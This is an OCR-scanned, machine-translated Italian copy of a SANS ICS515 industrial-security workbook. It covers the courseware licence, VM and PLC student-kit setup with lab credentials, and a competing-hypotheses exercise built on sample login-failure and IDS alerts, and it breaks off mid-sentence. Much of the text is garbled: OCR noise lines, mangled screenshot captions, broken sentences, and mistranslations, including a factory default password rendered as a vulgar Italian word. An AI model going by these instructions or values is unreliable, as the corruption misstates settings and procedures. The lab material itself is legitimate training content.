PP» FW WD WD Ww wh Ww ew lw lel lk lw OleOle lle

Noi

ICS515 | VISIBILITÀ, RILEVAMENTO E RISPOSTA DEI ICS
Risposta GIAC e difesa industriale (GRID)

Cartella di lavoro

GIAC

CERTIFICAZIONI

NANS

LA FONTE PIÙ AFFIDABILE PER LA FORMAZIONE, LA CERTIFICAZIONE E LA RICERCA SULLA SICUREZZA DELLE INFORMAZIONI | sans.org

Risorse gratuite sulla sicurezza informatica

sans.org/free

Gli istruttori e gli analisti SANS producono migliaia di risorse e strumenti gratuiti per il
community sulla sicurezza informatica, che comprende oltre 150 strumenti gratuiti e centinaia di white paper

scritto ogni anno. SANS continua a impegnarsi a fornire istruzione e capacità gratuite ai cittadini

comunità informatiche che serviamo, formiamo e certifichiamo.

Risorse gratuite della community sulla sicurezza informatica

Internet Storm Center: servizio gratuito di analisi e avvisi

Libri bianchi - Ricerca InfoSec sulla comunità

Blog - Blog sulla sicurezza informatica

Newsletter - Newsbites; @Rischio; AHIA!

Webcast: in diretta e archiviati

S0O@Oo®

Poster: risorse incentrate sul lavoro

=]) Sfida di hacking natalizio SANS
= Controlli di sicurezza critici - Azioni consigliate per

Difesa informatica

S Strumenti gratuiti: gli istruttori SANS hanno creato molto più di
150 strumenti open source che supportano il tuo lavoro e ti aiutano
implementi una migliore sicurezza

ee un (cioè)
(©) (fon) (£5)
(©) oy) Gp)

Unisciti alla comunità degli ex studenti SANS online

“Come al solito, i corsi SANS pagano
per se stessi entro il giorno 2.

Entro il terzo giorno, non vedi l'ora
tornare in ufficio per usarlo
quello che hai imparato."

it Evans, Hewlett Packard
Impresa -

Servizi di investigazione digitale

Formazione ed eventi gratuiti
> Test Drive di oltre 45 corsi SANS

>> Summit e forum SANS gratuiti

» Cyber-cattura-bandiera
Sfide

» Assi informatici

GIAC

CERTIFICAZIONI

NANS

Www.sans.org

Vm
Sì UU

1CS515| VISIBILITÀ, RILEVAMENTO E RISPOSTA DEI ICS
Risposta GIAC e difesa industriale (GRID)

Cartella di lavoro

GIAC

CERTIFICAZIONI

NANS

LA FONTE PIÙ AFFIDABILE PER LA FORMAZIONE, LA CERTIFICAZIONE E LA RICERCA SULLA SICUREZZA DELLE INFORMAZIONI | sans.org

NON phyfyjy mt

1CS515| VISIBILITÀ, RILEVAMENTO E RISPOSTA DEI ICS
Risposta GIAC e difesa industriale (GRID)

Cartella di lavoro

GIAC

CERTIFICAZIONI

SAN

LA FONTE PIÙ AFFIDABILE PER LA FORMAZIONE, LA CERTIFICAZIONE E LA RICERCA SULLA SICUREZZA DELLE INFORMAZIONI | sans.org

© 2021 Robert M. Lee. Tutti i diritti riservati a Robert M. Lee e/o al SANS Institute.

SI PREGA DI LEGGERE I TERMINI E LE CONDIZIONI DEL PRESENTE CONTRATTO DI LICENZA DEL CORSO
"CLA") CON ATTENZIONE PRIMA DI UTILIZZARE QUALSIASI CORSO ASSOCIATO AL SANS
CORSO. QUESTO È UN CONTRATTO LEGALE ED ESECUTIVO TRA TE (L'UTENTE) E
SANS ISTITUTO PER IL CORSO. ACCETTI CHE QUESTO CONTRATTO È
ESECUTIVO COME QUALSIASI ACCORDO NEGOZIATO SCRITTA DA VOI FIRMATO.

Con il presente CLA, SANS Institute concede all'Utente una licenza personale e non esclusiva per l'utilizzo del Courseware
soggetto ai termini del presente accordo. Il materiale didattico include tutto il materiale stampato, compresi i libri di testo
e cartelle di lavoro di laboratorio, nonché qualsiasi supporto digitale o di altro tipo, macchine virtuali e/o set di dati distribuiti da
SANS Institute to User per l'utilizzo nella classe SANS associata al Courseware. L'utente accetta che
CLA è la dichiarazione completa ed esclusiva di accordo tra te e SANS Institute e questo
CLA sostituisce qualsiasi proposta, accordo o altra comunicazione orale o scritta relativa all'argomento
questione di questo CLA.

ACCETTANDO QUESTO CORSO, L'UTENTE ACCETTA DI ESSERE VINCOLATO AI TERMINI DEL PRESENTE CLA.
ACCETTANDO QUESTO SOFTWARE, L'UTENTE ACCETTA CHE QUALSIASI VIOLAZIONE DEI TERMINI DEL PRESENTE CLA
PUÒ CAUSARE DANNI IRREPARABILI E LESIONI SIGNIFICATIVE A SANS INSTITUTE, E CHE
IL SANS INSTITUTE PUÒ APPLICARE QUESTE DISPOSIZIONI MEDIANTE INGIUNZIONE (SENZA IL
NECESSITÀ DI POSTAZIONE DI CAUZIONE) PRESTAZIONE SPECIFICA, O ALTRO EQUITATIVO Sgravio.

Se l'Utente non è d'accordo, può restituire il Courseware al SANS Institute per un rimborso completo, se applicabile.

L'utente non può copiare, riprodurre, ripubblicare, distribuire, visualizzare, modificare o creare opere derivate basate su
tutto o parte del Courseware, su qualsiasi supporto sia esso stampato, elettronico o altro, per qualsiasi
scopo, senza il previo consenso scritto di SANS Institute. Inoltre, l'Utente non può vendere, affittare,
noleggiare, scambiare o trasferire in altro modo il Courseware in qualsiasi modo, forma o forma senza espressa autorizzazione scritta
consenso del SANS Institute.

Se una qualsiasi disposizione del presente CLA viene dichiarata inapplicabile in qualsiasi giurisdizione, tale disposizione lo sarà
considerati separabili dal presente CLA e non pregiudicheranno la parte restante dello stesso. Un emendamento o
un'addendum al presente CLA potrebbe accompagnare il presente Materiale didattico.SANS riconosce che qualsiasi software e/o strumento, grafica, immagine, tabella, tabella o grafico
presentati in questo Courseware sono di proprietà esclusiva dei rispettivi marchi/registrati/copyright
proprietari, tra cui:

AirDrop, AirPort, AirPort Time Capsule, Apple, Apple Remote Desktop, Apple TV, App Nap, Torna a My
Mac, Boot Camp, Cocoa, FaceTime, FileVault, Finder, FireWire, logo FireWire, iCal, iChat, iLife, iMac,
iMessage, iPad, iPad Air, iPad Mini, iPhone, iPhoto, iPod, iPod classic, iPod shuffle, iPod nano, iPod touch,
iTunes, logo iTunes, iWork, portachiavi, Keynote, Mac, logo Mac, MacBook, MacBook Air, MacBook Pro,
Macintosh, Mac OS, Mac Pro, Numbers, OS X, Pages, Libretto, Retina, Safari, Siri, Spaces, Spotlight,
C'è un'app per questo, Time Capsule, Time Machine, Touch ID, Xcode, Xserve, App Store e iCloud sono
marchi registrati di Apple Inc.

PMP® e PMBOK® sono marchi registrati di PMI.

SOF-ELK@ è un marchio registrato di Lewes Technology Consulting, LLC. Utilizzato con permesso.

SIFT@ è un marchio registrato di Harbingers, LLC. Utilizzato con permesso.

Legge applicabile: il presente Contratto sarà regolato dalle leggi dello Stato del Maryland, USA.

ICS515_W_G01_09
wwe Ww

|

Ww & WwW WS WS WwW W

noi noi w&

ww wow Ww noi ww

Obiettivi

Prepararsi per i laboratori in classe
Registra gli account necessari

Compito: prepararsi per i laboratori di classe:

Trasferisci i file della lezione sul tuo computer
> Ti verrà fornito un collegamento per il download dei file multimediali del corso nel tuo portale SANS
> C'è una cartella zip nei file multimediali del corso, trasferiscila sul tuo sistema host
Estrai il contenuto del file zip
> Estrai il contenuto del file zip sul tuo sistema host
io. Puoi scegliere qualsiasi posizione desideri, ad esempio il desktop
Installa VMWare Player
> Puoi utilizzare la tua versione professionale o installare una versione di prova dal loro sito web
e Non è necessaria la versione a pagamento per completare il corso
> Gli utenti Windows utilizzeranno VMWare Player e gli utenti Mac utilizzeranno VMWare Fusion
Carica le macchine virtuali
> Una volta estratti i dati, caricare la macchina virtuale Windows e la macchina virtuale RELICS su
assicurati che la virtualizzazione funzioni sulla tua workstation
io. Se riscontri errori che non riesci a risolvere, chiedi al tuo istruttore (lezione dal vivo) o
Contatto su richiesta. I problemi comuni includono il fatto di non aver estratto i file e di provare a farlo
eseguire la VM dall'interno del file zip o non avere la virtualizzazione abilitata sull'host
sistema che richiede una modifica nel BIOS. Questo dipende dal sistema host
> Una volta verificato l'avvio delle macchine virtuali, il gioco è fatto; non hai bisogno
per accedere o continuare, questo è solo un controllo per garantire che la virtualizzazione funzioni per te e tu lo sia
pronti per procedere con i laboratori
> Se desideri accedere alle VM le credenziali sono:
Macchina virtuale Windows
e Nome utente = sansics
e Password = sansics
RELIQUIE VM
e Nome utente = reliquie
e Password = reliquie

© 2021, Robert M. Lee LabO-1
vw WV wo oY noi ew ew

wv ww WY Ww WW

siamo noi ww noi Ww

)

È

a3

Obiettivi

e Costruire il kit per studenti SANS515 (PLC)
e Caricare la logica di configurazione del test hardware sul PLC

*Informazioni sullo scenario* Nel contesto dello scenario dei giorni 1-5, il PLC e la sua rete di accompagnamento
a cui avrai accesso fisico è Calistoga Power Operations che copre Power Generation, Power
Trasmissione e distribuzione dell'energia. Tecnicamente ciò significa 3 operazioni di potenza, quindi per brevità faremo riferimento a
Calistoga 3 Operazioni di potenza (C3PO).

Nota: la configurazione delle impostazioni di rete della macchina virtuale (VM) è fondamentale per il successo del laboratorio e lo è
un problema comune di risoluzione dei problemi per gli studenti. Verificare l'intervallo di indirizzi IP e garantire la rete VM
La scheda di interfaccia (NIC) è in modalità Bridge quando richiesto nella procedura dettagliata del laboratorio. I seguenti sono comuni

percorsi di risoluzione dei problemi da considerare in caso di problemi. Segui la procedura dettagliata e torna a questi se
necessario.

Percorsi generali di risoluzione dei problemi:

1. Assicurarsi che nel software Click il tipo di porta sia Ethernet

2. Assicurarsi che le impostazioni della VM siano in modalità Bridged

3. Assicurati che quando il kit è collegato sia connesso alla tua macchina host (non alla VM)

4. In rari casi potrebbe essere necessario disabilitare il software antivirus sul tuo host o inserire nella lista bianca le applicazioni

5. Se la connettività Bridge non funziona, connettersi invece alla VM e modificare l'indirizzo IP di Windows
all'intervallo 169.254.x.x/16

6. Se sul PLC è presente una spia rossa "err", scollegare e ricollegare l'alimentazione al PLC

7. In alcuni casi, il cambio delle porte USB su una macchina consente la funzionalità prevista per la connettività del kit

8. In VMWare Workstation Pro 16 è necessario configurare le impostazioni di bridging automatico. Nel giocatore
vedi "Configura adattatori" direttamente nelle Impostazioni VM. In Pro è in un'impostazione globale dedicata
in Modifica > Editor della rete virtuale > Modifica impostazioni > Impostazioni automatiche

9. Cambia la rete da Bridge a NAT e di nuovo a Bridge (aiuta con possibili problemi della VM)

10.Riavvia il kit, riavvia la VM, assicurati che il PLC sia impostato per funzionare, quindi chiedi aiuto a un istruttore

Questo esercizio utilizzerà la macchina virtuale Windows e il kit SANS ICS515 Student.

© 2021, Robert M. Lee Lab 1.1-1
1. Cosa altera l'interruttore Sim 2 quando la logica viene caricata nel controller logico programmabile (PLC)?

Attività: creare il SANS515 Student Kit (PLC)

*Nota* Per prima cosa disimballare tutti i materiali.

> Il tuo kit da studente contiene:
CLICCA su PLC Pro con modulo C2-O8DR-6V
CLIC Scheda Ingresso/Uscita CO-O8CDR
CLIC Scheda di simulazione CO-O8SIM
Circuito stampato SANS 1CS515
Cavo Ethernet da 1 piede
Adattatore da USB a Ethernet
Tre cablaggi della morsettiera
Alimentazione internazionale
> Dopo aver rimosso tutti gli elementi dalla scatola del kit studente, salva la scatola come preferisci
ne avrai bisogno per conservare o spedire il tuo kit studentesco in futuro.
> Collegare il cablaggio di ingresso/uscita del processo
>> La scheda del kit studente contiene quattro punti di connessione nella parte superiore della scheda

VVVVVVVV

> Con il kit studente sono stati forniti tre cablaggi della morsettiera a cui collegarsi
i quattro punti di connessione sul circuito

© 2021, Robert M. Lee Lab 1.1-2

oud bbb wb wb &

uwww

vu bv vb &

vu J Jv VY WY

u.a

io. Collega i quattro connettori dei fili alle rispettive posizioni sui pannelli studente
ii. Ogni connettore si inserisce solo in un punto sulla scheda e in una direzione
iii. Collegare le morsettiere ai moduli CLICK PLC
iv. Ciascuna morsettiera può essere occupata solo in una posizione sui moduli PLC
** Assicurarsi che le tre morsettiere siano inserite completamente nel PLC

iv
v.
eee

eee

> Collegare l'alimentazione
> Disimballare l'alimentatore universale
> Inserisci l'alimentatore appropriato in base alla regione in cui ti trovi e collegalo a un
fonte di alimentazione adeguata
> Collegare l'alimentazione al modulo di alimentazione nell'angolo in alto a destra della scheda del kit studente

© 2021, Robert M. Lee Lab 1.1-3
Ss ses 8s» & 8 @2 @ @ @ dD O@ DD OO OD OO 8 DD DB DB HB BD H wB

4

Laboratorio 1.1 --

© 2021, Robert M. Lee

La scheda dovrebbe accendersi e assomigliare all'immagine sopra.

>
vw vw wwe noi He noi ee noi noi

Attività: connettersi al PLC e caricare la logica di convalida dell'hardware

> Collega il Kit Studente ICS515 (Kit) al tuo laptop
> Individua l'adattatore da USB a Ethernet (adattatore Atolla fornito nel kit dello studente)
> Individua il cavo Ethernet da 90 cm fornito nel kit dello studente.
> Collegare il cavo Ethernet all'adattatore USB e all'interfaccia CLICK Ethernet
> Collega il cavo USB che collega il Kit al tuo laptop (è stato fornito l'adattatore USB C)

*Nota* Le impostazioni di rete della VM per il corso richiederanno una connessione di rete fisica dall'host
workstation al PLC e le macchine virtuali saranno entrambe impostate in modalità Bridge per utilizzare un fisico comune
connessione dall'host. Se richiesto quando si collega l'adattatore da USB a Ethernet, farlo sempre
connettersi all'host (non alla VM). Modifichiamo anche le impostazioni di connessione del bridge per garantire che la VM non provi a farlo
utilizzare un adattatore diverso quando si tenta di comunicare con il PLC.

Avvia VMWare Player

Seleziona la VM Win e quindi modifica le impostazioni della macchina virtuale

Assicurati che l'adattatore di rete VM sia in modalità Bridged e seleziona l'opzione "configura adattatori".
selezionare l'adattatore di rete corretto.

Selezionare Sì nel prompt dell'UAC

VvVVV

Controllo dell'account utente

Vuoi consentire a questa app di creare
modifiche al tuo dispositivo?

Questo prodotto VMware richiede l'amministratore
privilegio. Se si fa clic su Annulla, l'applicazione
avrà funzionalità limitate.

Editore verificato: VMware, Inc.
Origine del file: disco rigido su questo computer

Mostra più dettagli

> Deseleziona tutte le interfacce, tranne l'interfaccia ASIX.
> Al termine, selezionare OK

© 2021, Robert M. Lee Lab 1.1-5
Riepilogo ~ - Stato del dispositivo
46 GB | lv] Connesso
{Processori 2 | connettersi all'accensione
E)Disco rigido (SCST) 100 GB |
©) CD/DVD (SATA) Datazione automatica | Connessione di rete
"2 Adattatore di rete a ponte (automatico) | @bridged: connesso direttamente alla rete fisica
= |
(usa Controller presente | Replica lo stato della connessione di rete fisica
) Rilevamento automatico della scheda audio
Presente | Configura adattatori
Rilevamento automatico NAT: utilizzato per condividere l'indirizzo IP dell'host
| Solo Qhost: una rete privata condivisa con l'host
LO Octo: Sari virtual notore
| Impostazioni bridging automatico x Ee
io | Seleziona gli adattatori di rete host che desideri collegare automaticamente:
| [ASI AX88179 Adattatore da USB 3.0 a Gigabit Ethernet 3 t
| [J Adattatore virtuale Microsoft Wi-Fi Direct n.2
| Microsoft Wi-Fi Direct Virtual Adapter LAN Seaments...] [Avanzato

|

|

Adattatore di rete wireless Killer(R) Wi-Fi 6 AX16S0w 160 MHz (20002 W)
| {_]killer € 3100x Controller Ethernet da 2,5 Gigabit (2)

Dispositivo Bluetooth (rete area personale)

Annulla Aiuto

*Nota* I passaggi per aggiungere e configurare l'adattatore USB al tuo host e impostare il bridging delle VM varieranno se lo sei
utilizzando VM Workstation Professional o VM Fusion. I passaggi forniti in questo lab sono specifici di VM Player.> Avviare la VM Windows ICS515, se viene richiesto di scaricare gli strumenti VM selezionare "ricordamelo più tardi"
> Accedi alla macchina VM Windows

> ACCEDI =sansics

> PASSWORD = sansics

> Caricare un file logico di convalida hardware nel PLC
> Individua il file dello studente: "ICS515 Mfg V3 for Production Boards.ckp"

© 2021, Robert M. Lee Lab 1.1-6

uwdedds wb ww

oe ww wu Ww

Oh

Se noi & ww W@W VU Ww W

Condividi vista

> File degli studenti

Nome
st Accesso rapido
Desktop Bl * ICS515 Mfg V3 per Production Boards.ckp
ICS515 Modifica OEM V2.ckp
& Download "
= Test di accettazione del sito ICS515 V1.ckp

> Fare doppio clic sul file e verrà avviato il pacchetto software di programmazione CLICK

Software di programmazione CLICK (Versione 201) - ICS515V8 per Production Boards.ckp ~ [Programma principale] -

Programma Funzione PLC
{ Bey PemoteCommwt » Cale
1 transallarmi Inizializza

Sy Trasmissione ‘A Contatto (NC)
Sey Transtate

chiamo "(Contatto Bl Edge
—Ben
dei commenti di modifica rung possono:

Ld Generazione di informazioni sul programma locale
Controllo della sintassi

| Chiamata per visualizzazione riferimento incrociato 8B

= Monitor ——— Gen_Fuel_Controt

|| Monitoraggio dello stato BR
| e Visualizzazione dati

TBrosting punto Me Diet Alasci

> All'apertura dell'applicazione, trovi nel menu in alto l'icona con la freccia rossa verso il basso che ti serve

Scrivere un progetto in un PLC

Scrivi progetto nel PLC (Shift+F9)

Pio hc, AMOR AKIE 8)

© 2021, Robert M. Lee Lab 1.1-7
> Apparirà una schermata di connessione, potrebbe essere necessario selezionare Ethernet nel menu a discesa Tipo di porta e
potrebbe essere necessario selezionare l'adattatore di rete appropriato nel menu a discesa Adattatore di rete.
L'adattatore potrebbe apparire come un adattatore di rete Intel a causa della configurazione del bridge nella VM
impostazioni.

> Dovresti vedere un PLC che è stato scoperto.

> Fare clic sul pulsante Connetti
Nota per la risoluzione dei problemi: con alcune configurazioni delle workstation degli studenti abbiamo osservato la necessità di farlo
modificare l'indirizzo IP dell'adattatore VM Windows per allinearlo all'intervallo DHCP predefinito di Click.
Impostando temporaneamente l'adattatore VM Windows sullo stesso intervallo 169.254, scrivendo la logica nel file
PLC, per poi tornare all'impostazione 192.168.0.8.

|Collegarsi al CLICK PLC x

Connessione diretta
Posizione del PLC CLICK di destinazione

Tipo di porta: Ethernet a
@ Nella stessa LAN (scansiona automaticamente tutti i PLC CLICK nella LAN,
= ior ba stessa LAN (scansiona n automaticamente.)
) e a
pres Vedere sì “rs Re C9) QAll'esterno di questa LAN (è necessario assegnare manualmente l'indirizzo IP e il numero di porta.)
Nome PLC Lech Indirizzo IP Subnet Mask Numero parte Modalità firmware = Stato Indirizzo Mac
et rcoieeg? isagatons Ps h499,254,39.254 1255.255.0.0 | ver3.00

Maschera di sottorete: 255.255.255.0
Gateway predefinito: 192.168.0.10

Aggiorna Lampeggia i LED RUN ed ERR Modifica...

> Potrebbe essere richiesto di fornire una password di autenticazione. Per un PLC completamente pulito lo farai
inserire "clic" per la password. Per un PLC che è stato inizializzato durante la creazione del kit SANS per studenti
potrebbe essere necessario inserire "sansics123"

Accedi x Accedi x
Inserisci nome utente e password, Inserisci nome utente e password.
eae Ss
Nome utente: | adel eee |
Parola d'ordine: | sansics 123. rs
M Visualizza password
Password predefinita di fabbrica = “cazzo” Password predefinita di fabbrica = “cazzo”
Tentativo di accesso non riuscito: 1 di 3
Ha dimenticato la password? Ha dimenticato la password?

ET] fea [oc coreet

> Con la password corretta inserita, inizierà il processo di scrittura del progetto sul PLC. Voi
verrà richiesto di scrivere il progetto. Se viene richiesto di eseguire una modifica in fase di esecuzione, è possibile selezionare Sì oppure
è possibile impostare l'interruttore sul PLC CLICK su Stop e quindi selezionare Ok.

© 2021, Robert M. Lee Lab 1.1-8
4B noi ww

“Bs 4B’

"sì è"

o noi w ww

Scrivi il progetto nel PLC

PC—

Nome del progetto: {ICS515 Mfg V3 per schede di produzione |
Dimensioni del programma (totale: 8.000 passaggi)

Dimensioni del programma Wi: 26 passi (3,31%)
Area GiFree: 7.735 passi (96,69%)

0 8.000 |

| (File di progetto (totale: 262, 144 byte) 1

Dimensione file GiProject 17.372 byte (6,62%)
Area GiFree: 244.772 byte (93,38%) |
| io eh
D 262.144 |
Ultimo aggiornamento: 07 luglio 2021, 19:06:00
scrivere il file di progetto nel PLC

Abilitando questa opzione, il file di progetto sarà
scaricato (scrittura) nel PLC. Se vuoi disabilitare
caricamento del progetto (lettura), disabilita questa opzione.

> Una volta completata la scrittura del progetto, potresti ricevere una notifica dell'avvenuta comunicazione
perduto. Ciò è dovuto alla modifica dell'indirizzo IP del PLC. L'indirizzo per il PLC è stato impostato quando

Ultimo aggiornamento: ee ney cee etn

PLC

cPUTipo: §—[C2-01CPU

NomeProgetto: [io

Dimensioni del programma (totale: 8.000 passaggi)

Dimensioni WliProgram: Ossteps (0,00%)
Area UiFree: 8.000 passi ( 100,00 %)

0 8.000

File di progetto (totale: 262, 144 byte)

Il file di progetto non lo era
scaricato in questo modulo CPU.

Modifica tempo di esecuzione

Questo modulo CPU non supporta la modifica del tempo di RUN.

la logica è stata caricata sul PLC. Seleziona semplicemente Riconnetti.

Fare clic sul software di programmazione

: La sessione di programmazione sul PLC è terminata
!\ disconnesso. Riconnettiti o scegli

per lavorare offline.

© 2021, Robert M. Lee

Laboratorio 1.1-9
Attività: verifica degli elementi hardware

Cosa altera il Sim Switch 2 quando la logica viene caricata nel controller logico programmabile (PLC)?

l'intersezione

Mettere l'interruttore del PLC su Run
Con la logica di convalida hardware caricata nel PLC, testare ciascun elemento.

Partendo dal quadrante di generazione in alto a sinistra del circuito:
> Premi il pulsante Apri interruttore del piazzale: questo dovrebbe testare l'indicatore di chiusura
> Premi il pulsante Chiudi interruttore del piazzale: questo dovrebbe testare l'indicatore Intertie

Spostarsi in alto a destra Quadrante di trasmissione del circuito:
> Premere il pulsante Apri interruttore: questo dovrebbe testare l'indicatore Chiudi
> Premere il pulsante Chiudi interruttore: questo dovrebbe testare l'indicatore di ripristino del relè di protezione
> Premere il pulsante Guasto relè di protezione: questo dovrebbe testare la regione di servizio residenziale più alta
indicatore
> Premere il pulsante di ripristino del relè di protezione: questo dovrebbe testare la regione del servizio residenziale centrale
indicatore

Spostarsi in basso a destra nel quadrante di distribuzione del circuito:
> Premere il pulsante Richiusura aperta: questo dovrebbe testare la regione di servizio residenziale inferiore
indicatore
> Premere il pulsante Chiusura richiusura: questo dovrebbe testare lo stato del servizio clienti industriale
indicatore
> Ruota il potenziometro di distribuzione: questo dovrebbe aumentare la produzione di MW di generazione di energia
indicatore. Gira fino al massimo

Spostarsi nel quadrante Industry in basso a sinistra del circuito:
> Ruota il potenziometro di settore: questo dovrebbe aumentare il display a sette segmenti su un valore.
Gira fino al massimo

A questo punto tutti gli indicatori sulla scheda dovrebbero essere verdi e l'indicatore di produzione MW dovrebbe essere acceso
e il display a sette segmenti dovrebbe mostrare un valore

Ora testeremo ciascun interruttore sul modulo di simulazione PLC

Gira l'interruttore 1 a destra: l'interruttore del piazzale dovrebbe essere rosso e chiuso

Ruota l'interruttore 2 verso destra: l'indicatore di intertie dovrebbe essere rosso

Ruotare l'interruttore 3 a destra: l'interruttore della trasmissione deve essere rosso e chiuso

Ruotare l'interruttore 4 verso destra: il relè di protezione dovrebbe essere rosso e ripristinato

Ruotare l'interruttore 5 verso destra: l'indicatore della regione di servizio residenziale superiore dovrebbe accendersi
Ruotare l'interruttore 6 verso destra: l'indicatore della regione di servizio residenziale centrale dovrebbe accendersi
Ruotare l'interruttore 7 verso destra: l'indicatore inferiore della regione di servizio residenziale dovrebbe accendersi
Ruota l'interruttore 8 verso destra: lo stato del servizio industriale dovrebbe accendersi

VVVVVVVV

© 2021, Robert M. Lee Lab 1.1-10

ra] co ra]

oh
uwwnwwHwwo oO

www

Esercizi da asporto

Lo scopo di questo esercizio era costruire il kit per studenti ICS515 che verrà utilizzato per una serie di laboratori
durante tutto il corso ICS515. Un altro scopo era quello di familiarizzare gli studenti con le nozioni di base di un controller
mostrando come i file logici vengono caricati su un dispositivo e come è possibile interagire con essi tramite l'ingegneria
Software.

È possibile chiudere tutte le applicazioni aperte e aprire le finestre di esplorazione file all'interno della VM Windows ICS 515 e quindi
è possibile arrestare la VM Windows.

© 2021, Robert M. Lee Lab 1.1-11
we FF 8 8 wo ww © Ww wD Ww wo Ww

ww ww

'=

_

___Lab 1.2 — Tecniche Analitiche Strutturate _

e Sfrutta una delle tecniche analitiche strutturate più comuni: ACH

*Informazioni sullo scenario* Nel contesto degli scenari dal giorno 1 al giorno 5, i partecipanti assumono il ruolo di una minaccia
analista dell'intelligence per identificare il tipo di informazioni disponibili pubblicamente sulla propria organizzazione. Questo sarà
essere utilizzato insieme ad altri dati di rete e sfruttato con l'analisi delle ipotesi concorrenti (ACH).
Lo scopo di questo laboratorio è esercitare la mente analitica utilizzando ACH.

Preparazione agli esercizi

Questo esercizio non richiede alcuna preparazione né utilizza VM o dati di laboratorio.

Attività: analizzare i dati provenienti dalla rete e dall'Honeypot ICS

*Nota* Lo scenario del corso si svolge nella città di Calistoga con varie operazioni industriali. Tuttavia, noi
non sono ancora entrati nella rete delle raffinerie di petrolio o nelle reti di energia elettrica. Questo lab utilizzerà Traffic
Rete luci per il controllo comunale della città. Questa rete non farà parte di uno scenario più ampio ma lo è
utile per iniziare questo esercizio.

> Mappa di rete: questa è una vista della rete conosciuta, le reti dello scenario ICS515 si trovano in altri
strutture.

© 2021, Robert M. Lee Lab 1.2- 1
\Sig

«a7

'ar.'

et rennin eeeennnennenrnininninemnn
{/

Zappa
. ny ae Sarees
_— e ~ ~—
_" ae” hs :
ea za | > et
Dominio aziendale Windows 7 Windows7
Utente del controller utente Honeypot

Rete di laboratori ICS 515

ics Trafficlight Trafficlight Traffictight + TrafficLight Storico dei dati
Honeypot RTU TU RT RTu

*Nota* Di seguito sono riportati gli eventi di sistema osservati nelle reti Business e ICS. Gli indirizzi 192.168.10.0/24 sono i
Rete aziendale e 10.10.10.0/24 sono le risorse della rete ICS. Le informazioni sono a tua disposizione estratte da
nei formati corretti (esempio: Syslog sarà più leggibile dall'uomo) ed è stato archiviato nella rete
Database degli analisti del monitoraggio della sicurezza.Ti viene chiesto di rivedere i dati, che normalmente sono Sicurezza di rete
Responsabilità del monitoraggio, perché il team di Threat and Environment Manipulation ha analizzato un pezzo di
malware in the wild (non trovato finora sulla rete) che tenta di accedere agli account ed è specifico
destinati agli ambienti ICS. Credono che potrebbe essere sulla rete, ma il monitoraggio della sicurezza della rete
il personale ritiene che non ci siano segni del malware. Invece, credono che probabilmente ci sia una minaccia interna.
Ti è stato chiesto di correlare i dati e trarre una conclusione imparziale su una di quelle teorie o
teorie alternative per aiutare a guidare la ricerca in corso dietro i dati anomali.

1. Accessi non riusciti a livello di sistema

e 1 dicembre 08:30:10 'Utente Windows 7': Jeff ACCESSO RIFIUTATO

e 1 dicembre 08:30:32 'Utente Windows 7': Jeff ACCESSO RIFIUTATO

e 3 dicembre 08:45:32 'Utente Windows 7': Jeff ACCESSO RIFIUTATO

e 8 dicembre 01:01:11 'Controllore del dominio: Dan ACCESSO RIFIUTATO
e 8 dicembre 01:01:16 'Controllore del dominio: Dan ACCESSO RIFIUTATO
e 8 dicembre 01:01:21 'Controllore del dominio: Dan ACCESSO RIFIUTATO
e 8 dicembre 01:01:26 'Controllore del dominio: Dan ACCESSO RIFIUTATO
e 8 dicembre 02:02:22 'ICS Honeypot': ACCESSO Admin RIFIUTATO

e 20 dicembre 10:20:13 'Business Honeypot': ACCESSO Admin RIFIUTATO
e 20 dicembre 10:22:40 'Utente Windows 7': Jeff ACCESS RIFIUTATO
e 20 dicembre 11:14:58 'ICS Honeypot': ACCESSO Admin RIFIUTATO

© 2021, Robert M. Lee Lab 1.2- 2

lm

ew eo

2. Avvisi del sistema di rilevamento delle intrusioni di rete

1 dicembre 12:30:20 SEXTERNAL -> Utente Windows 7

Messaggio: Tentativo di accesso alla porta 22

3 dicembre 12:20:42 SBusiness -> Storico dati

Messaggio: Porta 5450 flusso stabilito

8 dicembre 00:20:55 SEXTERNAL -> SBusiness

Messaggio: Scansione in rete sulla porta 22, porta 88 e porta 135
8 dicembre 02:02:22 SEXTERNAL -> ICS Honeypot

Messaggio: avviso per qualsiasi comunicazione IP con Honeypot: porta 502
8 dicembre 02:02:27 SEXTERNAL -> ICS Honeypot

Messaggio: avviso per qualsiasi comunicazione IP con Honeypot: porta 502
20 dicembre 10:20:13 SEXTERNAL -> Business Honeypot

Messaggio: avviso su qualsiasi comunicazione IP con Honeypot - Porta 22
20 dicembre 11:14:58 SBusiness -> ICS Honeypot

Messaggio: Alerted.on Any IP Communication to Honeypot - Port 22

> Dalle informazioni di cui sopra, pensa alle domande che vorresti porre a coloro che gestiscono il
architettura o coloro che eseguono il monitoraggio della sicurezza della rete (che hanno stabilito le regole).
> Qual è a questo punto una teoria che hai:

© 2021, Robert M. Lee

Laboratorio 1.2-3
Compito: scegli lo scenario più probabile

*Nota* Hanno fornito coloro che gestiscono l'architettura e coloro che eseguono il monitoraggio della sicurezza della rete
Informazioni aggiuntive.

e Il normale orario lavorativo è dalle 8:00 alle 17:00; tuttavia, c'è un individuo
presente in ogni momento, quindi potrebbero esserci comunicazioni in orari dispari

e Gli avvisi IDS nell'ambiente ICS sono configurati per avvisare in qualsiasi momento
qualcuno accede all'honeypot o al Data Historian; tuttavia, dati esterni
Sono ammessi collegamenti storici. Questo viene fatto semplicemente per la tenuta dei registri

e L'utente Dan è stato licenziato il 15 dicembre per aver costantemente violato la sicurezza aziendale
e controlli di conformità, incluso il download di software non autorizzato

e Non esistono regole IDS per l'accesso ad altri dispositivi ICS

1. Utilizzando le informazioni disponibili e gli avvisi relativi alla rete e all'honeypot, compilare il
Analisi della matrice delle ipotesi concorrenti con gli scenari possibili e lo scenario più probabile.
L'unica colonna e le due righe di esempio vengono compilate per facilitare l'avvio.

Il malware è_ | Un membro
in Rete | La minaccia è
Presente
Regola IDS porta TCP 502 attivata
la rete honeypot
© 2021, Robert M. Lee Lab 1.2- 4

ae ae @ >

e.a

(FF)

Dll
ehi! De! OO2

bs 'V S&S Se ww Ww

oo FF ww Ww

Esercizi da asporto

È difficile giungere ad una conclusione con assoluta certezza. ACH è storicamente guidato dall'analisi, ed è così
funziona meglio quando buone ipotesi vengono messe in competizione tra loro, indipendentemente da quali siano i dati
supporta. I dati quindi dovrebbero convalidare le teorie e aiutare gli analisti a scegliere l’ipotesi migliore. Honeypot
su una rete può aiutare a dare un senso ai set di dati perché dovrebbe esserci molta meno attività, se non nessuna
diretto a loro. In questo esercizio è stato possibile trarre buone conclusioni logiche e ipotesi che lo farebbero
